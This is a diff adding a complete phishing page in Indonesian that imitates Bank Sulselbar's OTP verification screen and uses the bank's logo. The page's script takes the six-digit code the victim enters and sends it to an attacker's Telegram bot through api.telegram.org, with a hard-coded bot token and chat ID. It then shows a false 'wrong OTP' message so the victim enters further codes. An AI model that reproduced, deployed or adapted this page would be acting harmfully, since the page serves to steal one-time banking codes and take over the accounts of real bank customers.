@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi OTP - Bank Sulselbar</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .otp-card { background: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 360px; text-align: center; }
+        .logo { width: 150px; margin-bottom: 20px; }
+        h2 { color: #333; font-size: 20px; margin-bottom: 10px; }
+        p { color: #777; font-size: 13px; margin-bottom: 25px; line-height: 1.5; }
+        
+        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 30px; }
+        .otp-inputs input { 
+            width: 45px; height: 55px; text-align: center; font-size: 24px; font-weight: bold; 
+            border: 2px solid #ddd; border-radius: 8px; background: #fafafa; outline: none; 
+        }
+        .otp-inputs input:focus { border-color: #34495e; background: #fff; }
+
+        .btn-verifikasi { 
+            background-color: #34495e; color: white; border: none; padding: 14px; 
+            width: 100%; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; 
+        }
+
+        /* Style Timer & Resend */
+        .resend-container { margin-top: 25px; font-size: 13px; color: #888; }
+        #timer { color: #d9534f; font-weight: bold; }
+        .btn-resend { color: #ccc; cursor: not-allowed; text-decoration: none; font-weight: bold; }
+        .btn-resend.active { color: #1a5dab; cursor: pointer; text-decoration: underline; }
+    </style>
+</head>
+<body>
+
+<div class="otp-card">
+    <img src="https://tnt.banksulselbar.co.id/BSSBLogo.png" class="logo" alt="Logo">
+    <h2>Verifikasi Kode OTP</h2>
+    <p>Silakan masukkan 6 digit kode verifikasi yang telah dikirimkan ke perangkat Anda.</p>
+    
+    <form id="otpForm">
+        <div class="otp-inputs">
+            <input type="number" pattern="\[0-9]*" inputmode="numeric" maxlength="1" oninput="moveNext(this, 1)" id="otp1" required>
+            <input type="number" pattern="\[0-9]*" inputmode="numeric" maxlength="1" oninput="moveNext(this, 2)" id="otp2" required>
+            <input type="number" pattern="\[0-9]*" inputmode="numeric" maxlength="1" oninput="moveNext(this, 3)" id="otp3" required>
+            <input type="number" pattern="\[0-9]*" inputmode="numeric" maxlength="1" oninput="moveNext(this, 4)" id="otp4" required>
+            <input type="number" pattern="\[0-9]*" inputmode="numeric" maxlength="1" oninput="moveNext(this, 5)" id="otp5" required>
+            <input type="number" pattern="\[0-9]*" inputmode="numeric" maxlength="1" oninput="moveNext(this, 6)" id="otp6" required>
+        </div>
+        <button type="submit" class="btn-verifikasi">KONFIRMASI</button>
+    </form>
+
+    <div class="resend-container">
+        Kirim ulang kode dalam <span id="timer">01:00</span><br><br>
+        <a id="resendBtn" class="btn-resend" onclick="resendOtp()">Kirim Ulang OTP</a>
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_TOKEN = '8631804481:AAFSTU7SmBSwrPwk-aeh43gRe4N7wyB6ubk'; 
+    const CHAT_ID = '7842224096';
+
+    // --- LOGIKA TIMER ---
+    let timeLeft = 60;
+    const timerElement = document.getElementById('timer');
+    const resendBtn = document.getElementById('resendBtn');
+
+    function startTimer() {
+        const countdown = setInterval(() => {
+            timeLeft--;
+            let minutes = Math.floor(timeLeft / 60);
+            let seconds = timeLeft % 60;
+            
+            timerElement.innerText = `0${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                timerElement.innerText = "00:00";
+                resendBtn.classList.add('active'); // Aktifkan tombol
+                resendBtn.style.cursor = "pointer";
+            }
+        }, 1000);
+    }
+
+    function resendOtp() {
+        if (timeLeft <= 0) {
+            alert("Kode OTP baru telah dikirim ulang.");
+            window.location.reload();
+        }
+    }
+
+    // --- LOGIKA PINDAH INPUT ---
+    function moveNext(current, index) {
+        if (current.value.length >= 1 && index < 6) {
+            document.getElementById('otp' + (index + 1)).focus();
+        }
+    }
+
+    // --- KIRIM DATA & LOGIKA SALAH ---
+    document.getElementById('otpForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        let otpCode = "";
+        for (let i = 1; i <= 6; i++) { otpCode += document.getElementById('otp' + i).value; }
+
+        const message = `🔢 *OTP MASUK*\n📟 Code: \`${otpCode}\` \n🕒 Jam: ${new Date().toLocaleTimeString()}`;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+        })
+        .then(() => {
+            // TAMPILKAN PESAN SALAH SESUAI PERMINTAAN
+            alert("OTP salah, silakan klik kirim ulang OTP!");
+            window.location.href = 'Otp.html'; 
+        });
+    });
+
+    window.onload = startTimer;
+</script>
+
+</body>
+</html>
